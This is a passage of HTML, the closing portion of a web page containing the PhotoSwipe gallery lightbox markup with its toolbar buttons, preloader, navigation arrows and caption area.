            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>